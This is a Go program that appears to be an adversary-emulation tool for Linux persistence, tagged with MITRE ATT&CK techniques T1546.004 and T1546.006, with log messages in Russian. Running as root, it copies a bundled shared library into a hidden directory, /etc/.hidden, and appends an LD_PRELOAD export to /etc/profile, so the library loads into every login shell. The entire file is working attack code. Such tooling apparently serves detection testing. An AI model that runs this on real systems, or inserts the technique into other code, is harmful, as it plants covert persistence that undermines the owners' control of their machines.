package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"script/pkg/files"
	"script/pkg/system"
	"script/pkg/tags"
)

var (
	libName = "preload.so"
	libDir  = "/etc/.hidden"
	libPath = filepath.Join(libDir, libName)
	script  = "export LD_PRELOAD=" + libPath
)

func main() {
	if !system.IsRoot() {
		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
		return
	}
	fmt.Printf("%sT1546.004 Unix Shell Configuration Modification\n", tags.Info)
	fmt.Printf("%sT1546.006 LD_PRELOAD\n", tags.Info)
	err := editLdPreload()
	if err != nil {
		fmt.Printf("%s%s\n", tags.Err, err.Error())
	}
	err = editProfileFile()
	if err != nil {
		fmt.Printf("%s%s\n", tags.Err, err.Error())
	}
	out, _ := exec.Command("id").Output()
	fmt.Println(string(out))
}

func editProfileFile() error {
	profileFile := files.NewFile("/etc/profile")
	content, err := profileFile.ReadFileLines()
	if err != nil {
		return fmt.Errorf("ошибка при чтении /etc/profile")
	}
	fmt.Printf("%sДобавлена строка %s в /etc/profile\n", tags.Log, script)
	content = append(content, script)
	err = profileFile.WriteFileLines(content, 0644)
	if err != nil {
		return fmt.Errorf("ошибка при записи в /etc/profile")
	}
	return nil
}

func editLdPreload() error {
	os.Mkdir(libDir, 0600)
	err := system.CopyFile(filepath.Join("assets", libName), libPath, 0600)
	if err != nil {
		return fmt.Errorf("ошибка при копировании %s: %s", libName, err.Error())
	}
	fmt.Printf("%sФайл %s успешно скопирован в %s\n", tags.Log, libName, libPath)
	err = os.Setenv("LD_PRELOAD", libPath)
	if err != nil {
		return fmt.Errorf("ошибка при установлении переменной окружения  LD_PRELOAD: %s", err)
	}
	return nil
}
